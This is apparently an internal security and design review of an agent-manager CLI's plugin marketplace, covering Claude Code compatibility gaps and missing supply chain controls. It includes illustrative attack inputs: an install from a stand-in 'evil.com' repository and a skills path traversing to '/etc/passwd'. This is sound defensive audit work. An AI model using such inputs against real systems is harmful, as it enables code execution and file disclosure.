# Marketplace Subsystem Deep Review

**Date:** 2026-04-16
**Reviewer:** marketplace design coherence, Claude Code compatibility, entity unification, supply chain security
**Scope:** `src/marketplace/*`, `src/commands/marketplace.ts`, related provenance schema, community adapter integration

---

## Summary

The marketplace subsystem is a **functional MVP** that successfully extends Claude Code's git-repo-based plugin distribution model to cover the full agent-manager entity palette: MCP servers, skills, agents, and (via ADR-0027) community adapters. It delivers the coherent unification story promised by the architecture — one `am marketplace install <name>` command installs any mix of entity types and wires them into `config.toml` + `adapters.toml` with provenance tracking. Iteration 15's fix is confirmed: `listInstalled` at `src/marketplace/installer.ts:264-352` correctly scans servers, skills, AND agents (the previously broken path).

However, the subsystem is **substantially behind Claude Code's own marketplace spec** and has **zero supply chain controls**. It does not read a top-level `marketplace.json` catalog file (Claude Code's actual format); it scans for plugins bottom-up by directory convention. It does not verify checksums, does not pin commits, does not prompt trust-on-first-use, does not enforce URL allowlists, and does not size-limit clones. Any user who runs `am marketplace add https://gitlab.evil.com/x.git` followed by `am marketplace install foo` is installing arbitrary adapter binaries and server commands onto their system with no integrity check whatsoever. The community adapter path (`src/adapters/community/loader.ts:26-64`) does checksum verification on binaries at load time — but the marketplace installer never writes a checksum into `adapters.toml`, so verification is silently skipped with a warning.

Maturity: ~5/10. The skeleton is right. The security and Claude Code interop work is unfinished.

---

## Claude Code Compatibility matrix

Claude Code's actual plugin marketplace format (per the public docs at docs.claude.com and per the research notes at `research/10-agent-protocols-and-standards.md:601`) uses a **top-level `.claude-plugin/marketplace.json` catalog file** in the repo root that lists plugins, with each plugin then having its own `.claude-plugin/plugin.json` manifest. The agent-manager marketplace scanner does **not** read the top-level catalog; it only scans for plugin manifests.

| Feature | Claude Code | agent-manager | Status |
|---|---|---|---|
| Top-level marketplace catalog (`.claude-plugin/marketplace.json`) | Required | **Not read** | INCOMPATIBLE — see `src/marketplace/scanner.ts:13-14` |
| Plugin manifest file name | `.claude-plugin/plugin.json` | `.am-plugin/plugin.json` OR `.claude-plugin/plugin.json` | Partial — fallback exists `src/marketplace/scanner.ts:14` |
| `name`, `description` required | Yes | Yes | Compatible `src/marketplace/scanner.ts:29` |
| `version` required | Yes (semver) | Optional | Divergent `src/marketplace/types.ts:60` |
| `author` shape | `{name, email, url}` | `{name, email}` (no `url`) | Minor gap `src/marketplace/types.ts:20-23` |
| MCP servers key | `mcpServers` | `servers` | **INCOMPATIBLE** `src/marketplace/types.ts:62` vs Claude Code's `mcpServers` (see `src/adapters/claude-code/marketplace.ts:22`) |
| Skills shape | `[{name, description, path}]` (objects) | `string[]` (paths only) | **INCOMPATIBLE** `src/marketplace/types.ts:63` vs `src/adapters/claude-code/marketplace.ts:20` |
| Agents shape | Not in plugin.json (separate `.md` discovery) | `Record<string, PluginAgentConfig>` | Divergent `src/marketplace/types.ts:64` |
| Hooks | Supported (`hooks[]`) | **Not modeled** | Missing — `PluginManifest` has no `hooks` field `src/marketplace/types.ts:57-67` |
| Commands / slash commands | Supported | **Not modeled** | Missing |
| Output styles | Supported | **Not modeled** | Missing |
| LSP servers | Supported | **Not modeled** | Missing |
| Adapter (extension-of-am) | n/a | `adapter` field | am-specific extension — fine |
| Repo layout | `plugins/<name>/.claude-plugin/plugin.json` | `plugins/<name>/` OR `<name>/` (flat) | Mostly compatible `src/marketplace/scanner.ts:72-79` |
| Marketplace identity (owner, source) | `owners[]`, `source: git|github|local` | `source: github|gitlab|local` (heuristic from URL) | Divergent `src/marketplace/types.ts:3` — owner/maintainer info lost |

**Verdict on the question "can we consume a Claude Code plugin repo directly?":**

Partially. If the plugin repo happens to put `plugin.json` inside `<plugin-dir>/.claude-plugin/` (which Claude Code's format requires) and the fields we consume (`name`, `description`) are present, scanning works. But:
- We ignore the Claude Code marketplace catalog file (`marketplace.json`), so we only find plugins via directory walk.
- We key on `servers` instead of `mcpServers`, so bundled MCP servers in a Claude Code plugin will not be installed — the `PluginManifest.servers` will be `undefined`.
- We key on `skills` as `string[]`, but Claude Code uses `[{name, description, path}]` objects. Parsing a Claude Code plugin's `skills` array as a string array will fail or produce garbage paths at `src/marketplace/installer.ts:142-157`.
- Hooks, commands, output styles, LSP entries are silently dropped.

The fallback to `.claude-plugin/plugin.json` is a **bait-and-switch** — it suggests compatibility that the schema does not deliver. A user who adds a Claude Code marketplace will see plugins appear in `am marketplace list`, run `am marketplace install <name>`, and end up with **no servers and broken skill paths**.

---

## Unification across entity types (findings)

### The good

The schema is genuinely unified. `PluginManifest` at `src/marketplace/types.ts:57-67` covers all four entity types in a single document:
- `servers: Record<string, PluginServerConfig>` — MCP servers
- `skills: string[]` — SKILL.md paths
- `agents: Record<string, PluginAgentConfig>` — agent profiles
- `adapter?: PluginAdapterConfig` — community adapter (singular, ADR-0027)

`applyPlugin` at `src/marketplace/installer.ts:96-185` handles all four uniformly: servers written to `config.toml` with `_marketplace` provenance, skills written to `config.toml.skills`, agents written to `config.toml.agents`, and the adapter registered in `adapters.toml` via `setCommunityAdapterConfig` at `src/marketplace/installer.ts:72-81`.

`listInstalled` at `src/marketplace/installer.ts:264-352` confirms the iteration-15 fix: all three entity dicts are iterated (servers at line 311, skills at line 317, agents at line 332) and deduplicated into a `pluginMap`. The result row includes `servers`, `skills`, and `agents` arrays.

`uninstallPlugin` at `src/marketplace/installer.ts:191-258` likewise removes all four entity types and refuses to claim success if nothing was removed (line 246-248).

### The bad

- **`list --installed` UX leaks the fix.** The CLI's installed renderer at `src/commands/marketplace.ts:65-70` only prints the server count: `${entry.plugin} (${entry.servers.length} server${...})`. Skills and agents installed from the same plugin are invisible. The JSON output at line 57 is correct; the human output is not.
- **Only one adapter per plugin.** `PluginManifest.adapter` is a single object, not a dict. A plugin cannot ship two adapters. Given adapter distribution is nascent this is acceptable, but it is silently different from every other entity type and will become a migration problem if it ever needs to be plural.
- **Skill name derivation is fragile.** `src/marketplace/installer.ts:143`: `const skillName = skillPath.replace(/\/$/, "").split("/").pop() || skillPath;`. Two skills at `skills/foo/SKILL.md` and `agents/foo/SKILL.md` both become `SKILL.md` (since `pop` takes the last segment after splitting). The collision silently overwrites. Correct logic would take the parent segment when the leaf is `SKILL.md`.
- **Agent key vs agent name mismatch.** The plugin manifest uses a `Record<string, PluginAgentConfig>` where the key is the config key but `PluginAgentConfig.name` is a separate field (`src/marketplace/types.ts:36`). `applyPlugin` writes the agent under the record key (`config.agents[name] = agent` at line 179) but uses `agentDef.name` (the config's internal `name` field) for the `AgentProfile.name` (line 165). This can produce an agent whose registry key differs from its declared name, which will confuse downstream lookups.

### The unification check (question 8)

Yes, adapters integrate correctly with `adapters.toml`. The installer at `src/marketplace/installer.ts:72-81` constructs a `CommunityAdapterConfig` with a synthesized `source` string like `marketplace:<mp>/<plugin>` when the manifest doesn't supply one, and calls `setCommunityAdapterConfig`. Uninstall at line 235 calls `removeCommunityAdapterConfig`. The `adapters` field in the `InstallResult` (line 30) and `UninstallResult` (line 39) is reported back to the user through the CLI at `src/commands/marketplace.ts:144` and `:272`.

However, the installer **does not write a `checksum` field** into the `CommunityAdapterConfig` at `src/marketplace/installer.ts:74-78`. This is a real problem — see Supply Chain section.

---

## Supply Chain Security

### What you get today if you run `am marketplace add https://gitlab.evil.com/x.git`

1. `addMarketplace` at `src/marketplace/client.ts:66` accepts the URL with **zero validation**: no scheme check, no allowlist, no domain restriction.
2. `detectSource` at `src/marketplace/client.ts:47-51` uses a substring match — anything containing "gitlab" becomes a "gitlab" source, anything else becomes "github". This is informational only, not a security boundary.
3. `git.clone` at `src/marketplace/client.ts:95-102` clones **the entire repo tree** (`depth: 1, singleBranch: true`). No size limit, no timeout, no file-count limit. A malicious repo with a 5 GB binary in `plugins/evil/SKILL.md` will happily fill the user's disk.
4. After clone, `scanMarketplace` reads every `plugin.json` it finds with `JSON.parse` at `src/marketplace/scanner.ts:27`. `JSON.parse` is safe by itself, but there is **no size limit** on the manifest file either.
5. When the user runs `am marketplace install evil-plugin`:
   - Server `command` and `args` from the attacker-controlled manifest are written directly into `config.toml` (`src/marketplace/installer.ts:118-122`). No shell metacharacter scrubbing, no path validation. On the next `am apply` or session, the command runs.
   - Skill paths are joined with `pluginDir` (`src/marketplace/installer.ts:145`) but **`skillPath` is not validated for path traversal** — a manifest entry of `"skills": ["../../../../../etc/passwd"]` produces a skill whose path escapes the marketplace clone directory. Whether this is exploitable depends on how downstream adapters dereference it, but it is clearly wrong by design.
   - Adapter `command` from the manifest is written directly into `adapters.toml` as an executable path (`src/marketplace/installer.ts:76`). When the community adapter loader spawns it next (`src/adapters/community/proxy.ts`), arbitrary code runs.
   - **Critical:** `verifyChecksum` at `src/adapters/community/loader.ts:31-34` is designed to reject missing checksums, but today's marketplace installer never writes one. The loader merely logs `"warning: community adapter ... has no checksum ... skipping integrity check"` and proceeds. The integrity check exists but is **unused in practice**.

### What's missing

| Control | Present? | Where it should live |
|---|---|---|
| URL scheme / host allowlist | **No** | `addMarketplace` at `src/marketplace/client.ts:66` |
| Trust-on-first-use prompt | **No** | `addMarketplace` |
| Clone size limit | **No** | `git.clone` call at `src/marketplace/client.ts:95` |
| Clone timeout | **No** | Same |
| Pinned commit / tag reference in marketplaces.json | **No** | `MarketplaceEntry` at `src/marketplace/types.ts:6-12` (only stores a `url`) |
| Lockfile of installed plugin + commit SHA | **No** | Would be a new `lockfile.toml` or extension of `MarketplaceEntry` |
| Manifest schema validation (Zod) | **No** — only `name` and `description` checked at `src/marketplace/scanner.ts:29` | `readPluginManifest` |
| Strict mode: malformed entry rejects whole marketplace | **No** — bad manifests are silently skipped at `src/marketplace/scanner.ts:31` | `scanMarketplace` |
| Shell metachar / path traversal scrub on `command`, `args`, skill paths | **No** | `applyPlugin` at `src/marketplace/installer.ts:96` |
| Checksum write on install | **No** | `installPlugin` at `src/marketplace/installer.ts:72-81` should compute sha256 of the adapter binary and persist to `adapters.toml` |
| Checksum enforcement (not just warning) on load | **Partial** — warning-only at `src/adapters/community/loader.ts:32-36` | Same |
| Signature verification (minisign / cosign / sigstore) | **No** | Out of scope for v1, but should be ADR'd |
| `git pull` integrity (force-fetch check, tag verification) | **No** | `updateMarketplace` at `src/marketplace/client.ts:131-181` accepts whatever the remote says |
| Confused deputy: local file:// URL creates symlink, no protection against symlink-escape at scan time | **No** | `src/marketplace/client.ts:91` — `symlink` is created unconditionally |

### Supply chain verdict

**Unsafe for untrusted marketplaces.** The design implicitly assumes the user only adds repos they fully trust. There is no defense-in-depth: a single malicious `plugin.json` in a cloned repo can register an arbitrary command to be executed by `am apply`, and a single malicious adapter binary runs on the next `loadCommunityAdapters` call with only a log-line warning.

For v1 release, the **minimum acceptable** security work is:
1. Pin `marketplaces.json` entries to a commit SHA (captured from `git.clone`).
2. Compute and persist sha256 of each adapter binary at install time.
3. Elevate the missing-checksum warning at `src/adapters/community/loader.ts:32` to a hard error (or at least gate it behind a `--allow-unsigned` flag).
4. Reject plugin.json with path traversal in `skills[]` or `.`/`..` segments in `command`.
5. TOFU prompt on first `am marketplace add` with unknown host.

---

## UX & discovery gaps

### Discovery

- **`list` does not show entity type.** At `src/commands/marketplace.ts:110-117`, each plugin's row shows `servers: N` and `adapter: yes` but not skills count or agents count. Compare the JSON at line 93-94 which includes all four.
- **`list --installed` shows only server count** (see Unification section). Users with a plugin that bundles 3 skills and 2 agents will think nothing is installed.
- **Search is shallow.** `searchPlugins` at `src/marketplace/scanner.ts:132-148` matches against `name`, `description`, server keys, and adapter command — **not** skill paths, agent names, or adapter source. No relevance weighting (alphabetic or chronological order only). A plugin whose name matches exactly is ranked identically to one where the query appears once in a description.
- **No category / tag filtering.** `am marketplace search email` returns all plugins mentioning email. There is no `--type server|skill|agent|adapter` filter to narrow.
- **No `am marketplace info <plugin>`.** Users cannot see a plugin's full manifest before installing. They see two lines of output and must run `am marketplace install` blind or `cat ~/.config/agent-manager/marketplaces/<mp>/plugins/<name>/.am-plugin/plugin.json`.

### Install UX

- **`--yes` flag is accepted but unused.** `installCommand` passes `opts.yes` to `installPlugin` at `src/commands/marketplace.ts:139`, but `installPlugin` at `src/marketplace/installer.ts:48-90` ignores it — no confirmation prompt is ever shown. Either implement the prompt or remove the flag.
- **No dry-run.** `am marketplace install --dry-run <foo>` would be the obvious way to preview what a plugin adds. Not supported.
- **No conflict detection.** If `config.toml` already has a server named `tavily` and a plugin also declares a server named `tavily`, the plugin silently overwrites it at `src/marketplace/installer.ts:134`. Contrast this with ADR-0028's brownfield merge logic for `am import` — marketplace install has none of it.
- **No version pinning.** `installPlugin` always installs the HEAD of the marketplace repo. Running `am marketplace update` then `am marketplace install foo` again could produce different results. Rollback is impossible.
- **No post-install hook or `am apply` automatic trigger.** The CLI prints `"Run \`am apply\` to generate native configs"` at `src/commands/marketplace.ts:145` — fine as a hint, but a `--apply` flag would be a nice affordance.

### Error paths

- `updateMarketplace` falls back from `main` to `master` at `src/marketplace/client.ts:164-170` but doesn't try the detected default branch (`HEAD`). A repo whose default is `dev` or `trunk` will always fail to update.
- Clone failure cleanup (`src/marketplace/client.ts:104-110`) swallows cleanup errors. If cleanup itself fails (e.g., partial directory with read-only files), the user sees only the original clone error and cannot re-add the marketplace because the dir still exists. `addMarketplace` will then fail on the later "directory already exists" check from the underlying git clone call.
- `removeMarketplace` at `src/marketplace/client.ts:186-210` does not remove plugins installed from that marketplace. Orphan servers/skills/agents with `_marketplace.package` pointing at a now-deleted marketplace will linger in `config.toml`. `am marketplace list --installed` will still show them. There is no cross-check.

---

## Recommendations

Priority-ordered. (P0 = before next release; P1 = before v1.0; P2 = hardening.)

### P0 — correctness and Claude Code interop

1. **Decide and document the Claude Code compat story.** Either:
   - (a) Treat `.claude-plugin/plugin.json` detection as a best-effort alias (current behavior) and clearly document the fields that are NOT compatible (`mcpServers` vs `servers`, skill object vs string), OR
   - (b) Add a true Claude Code compat layer: detect `.claude-plugin/` and translate `mcpServers` → `servers`, `skills[]` (objects) → `skills[]` (strings via `path`), read the top-level `marketplace.json` catalog file.
   Path (b) is the correct answer for "one marketplace handles servers, skills, agents" — otherwise the fallback is a user-facing bug.
2. **Write a Zod schema for `PluginManifest`** and validate in `readPluginManifest`. Reject manifests missing `name`, `description`, OR with malformed server configs (no `command`, command containing shell metacharacters, command as a relative path escaping the plugin dir). Currently only `name`/`description` presence is checked at `src/marketplace/scanner.ts:29`.
3. **Fix the skill name collision bug** at `src/marketplace/installer.ts:143`. When the leaf is `SKILL.md`, use the parent directory name.
4. **Fix the `list --installed` renderer** at `src/commands/marketplace.ts:65-70` to show skill and agent counts.
5. **Decide agent key semantics.** Either require `agentDef.name === key` and error otherwise, or stop storing both fields.
6. **Cross-delete orphans on `marketplace remove`.** Either prompt "uninstall N plugins first?" or refuse the removal.

### P1 — supply chain floor

7. **Pin commit SHA in `marketplaces.json`.** Extend `MarketplaceEntry` at `src/marketplace/types.ts:6-12` with a `commit: string` field captured at clone time from `git.resolveRef` after `git.clone`. Surface it in `am marketplace list`.
8. **Write checksums on adapter install.** In `installPlugin` at `src/marketplace/installer.ts:72-81`, compute sha256 of the adapter binary and include it in the `CommunityAdapterConfig.checksum` field. This makes the existing verifier at `src/adapters/community/loader.ts:26-64` actually useful.
9. **Promote missing-checksum warning to an error** at `src/adapters/community/loader.ts:32-36`, gated behind `--allow-unsigned`.
10. **Reject path traversal** in skill paths, adapter commands, and server commands/args. Use `path.normalize` + `!normalized.startsWith("..")` + reject absolute paths that fall outside the plugin dir.
11. **Add size and timeout limits on `git.clone`.** isomorphic-git supports an `onProgress` callback that can enforce a byte cap and an AbortController-style signal for timeouts.
12. **URL allowlist + TOFU prompt** in `addMarketplace`. At minimum, flag non-HTTPS URLs, non-standard ports, and hosts not previously used.

### P2 — UX and feature parity

13. **`am marketplace info <plugin>`** — show the full manifest, commit SHA, last-updated-at, and what installing would add.
14. **`am marketplace install --dry-run`** — print the diff without writing.
15. **Search relevance weighting** — exact name match > name prefix > description match > server key match. At minimum sort results.
16. **Conflict detection on install** that reuses the ADR-0028 brownfield merge logic rather than silently overwriting at `src/marketplace/installer.ts:134`.
17. **Model Claude Code hooks/commands/output-styles** in `PluginManifest` (even if we just import-and-ignore them for now). This lets us faithfully round-trip a Claude Code plugin instead of silently dropping fields.
18. **Top-level `marketplace.json` catalog** — read it if present as an index of plugins, falling back to directory scan. This is the piece that makes us a drop-in Claude Code marketplace consumer.
19. **Branch detection for `update`.** Use `git.getConfig` or `git.currentBranch` on the remote HEAD ref, not hardcoded main→master fallback.

### Non-goals (intentional, for clarity)

- Plugin sandboxing / execution isolation. This is a v2+ problem; flag it but do not solve it here.
- Cryptographic signatures (minisign/cosign). Valuable but should be its own ADR; sha256 checksum of artifacts is the correct v1 floor.
- A hosted marketplace registry. Git-based distribution is the deliberate choice (see ADR-0028, `docs/designs/2026-04-15-extensibility-import/marketplace-import.md`).

---

## Related files

- `src/marketplace/types.ts` — manifest and entry schemas
- `src/marketplace/client.ts` — add/update/remove/list marketplace repos
- `src/marketplace/scanner.ts` — plugin discovery in cloned repos
- `src/marketplace/installer.ts` — install/uninstall, applyPlugin, listInstalled
- `src/commands/marketplace.ts` — CLI surface
- `src/adapters/community/loader.ts` — adapter loader with checksum verification (currently skipped because installer doesn't write checksums)
- `src/adapters/community/types.ts` — `CommunityAdapterConfig`
- `src/adapters/claude-code/marketplace.ts` — reads Claude Code's actual plugin format (the real source of truth for compat)
- `src/core/schema.ts:15-29` — `MarketplaceProvenance` Zod schema
- `ADRs/0027-community-adapter-loading.md` — adapter distribution design
- `ADRs/0028-brownfield-import-merge.md` — marketplace import & merge design (referenced but marketplace install does not yet use the merge logic)
- `docs/designs/2026-04-15-extensibility-import/marketplace-import.md` — marketplace import design rationale
- `research/10-agent-protocols-and-standards.md:601` — Claude Code marketplace format research
